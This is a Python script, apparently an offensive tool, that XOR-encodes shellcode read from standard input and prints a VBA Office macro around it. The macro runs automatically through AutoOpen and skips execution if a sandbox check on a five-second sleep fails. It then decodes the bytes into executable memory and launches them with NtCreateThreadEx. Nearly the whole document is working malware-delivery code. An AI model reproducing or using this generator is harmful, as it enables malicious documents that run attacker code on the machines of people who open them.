#!/usr/bin/env python3
import sys
import re
from typing import NoReturn

def exit_err() -> NoReturn:
    print(f"error: while reading line from stdin: {sys.exc_info()[0]}", file=sys.stderr)
    exit(1)


def print_encrypted() -> None:
    payload = ""
    for i in range(0, len(encrypted), 50):
        payload += ','.join(map(str, encrypted[i:i + 50]))
        if (i + 50 < len(encrypted)):
            payload += ", _\n"

    print(f"""\
Private Declare PtrSafe Function GetCurrentProcess Lib "KERNEL32" ( _
) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" ( _
    ByVal mili As Long _
) As Long

Private Declare PtrSafe Function RtlCopyMappedMemory Lib "NTDLL" ( _
    ByVal lDestination As LongPtr, _
    ByRef sSource As Any, _
    ByVal lLength As Long _
) As Long

Private Declare PtrSafe Function NtAllocateVirtualMemory Lib "NTDLL" ( _
    ByVal ProcessHandle As LongPtr, _
    ByRef BaseAddress As LongPtr, _
    ByVal ZeroBits As Long, _
    ByRef RegionSize As LongPtr, _
    ByVal AllocationType As Long, _
    ByVal Protect As Long _
) As Long

Private Declare PtrSafe Function NtCreateThreadEx Lib "NTDLL" ( _
    ByRef threadHandle As LongPtr, _
    ByVal AccessMask As Long, _
    ByVal ObjectAttributes As LongPtr, _
    ByVal ProcessHandle As LongPtr, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal CreateSuspended As Long, _
    ByVal StackZeroBytes As Long, _
    ByVal SizeOfStackCommit As Long, _
    ByVal SizeOfStackReserve As Long, _
    ByVal lpBytesBuffer As LongPtr _
) As Long

Sub MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim res As Long

    t1 = Now()
    Sleep (5000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 5 Then
        Exit Sub
    End If

    Dim buf As Variant
    Dim crypt As Variant
    buf = Array({payload})
    crypt = Array(136, 57, 252, 119, 145, 205)

    Dim counter As Long
    Dim data As Long
    Dim maxSize As Long
    maxSize = &H1000
    Dim hProc As LongPtr
    hProc = GetCurrentProcess()
    Dim addr As LongPtr
    addr = 0

    res = NtAllocateVirtualMemory(hProc, addr, 0, maxSize, &H1000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter) Xor crypt(counter Mod (UBound(crypt) + 1))
        res =  RtlCopyMappedMemory(addr + counter, data, 1)
    Next counter
    Dim hThread As LongPtr
    res = NtCreateThreadEx(hThread, &H1F0FFF, 0, hProc, addr, 0, 0, 0, 0, 0, 0)
End Sub

Sub AutoOpen()
    MyMacro
End Sub\
""")


def get_line() -> str:
    try:
        line = input().strip()
    except (EOFError, KeyboardInterrupt):
        print_encrypted()
        exit(0)
    except:
        exit_err()

    return line


def xor() -> None:
    int_patt = re.compile(r'[0-9]+')
    i = 0
    array = [0x88, 0x39, 0xfc, 0x77, 0x91, 0xcd]
    while True:
        line = get_line()
        for byte in int_patt.findall(line):
            encrypted.append(int(byte) ^ array[i % len(array)])
            i += 1


def main() -> None:
    xor()

if __name__ == "__main__":
    encrypted = []
    main()
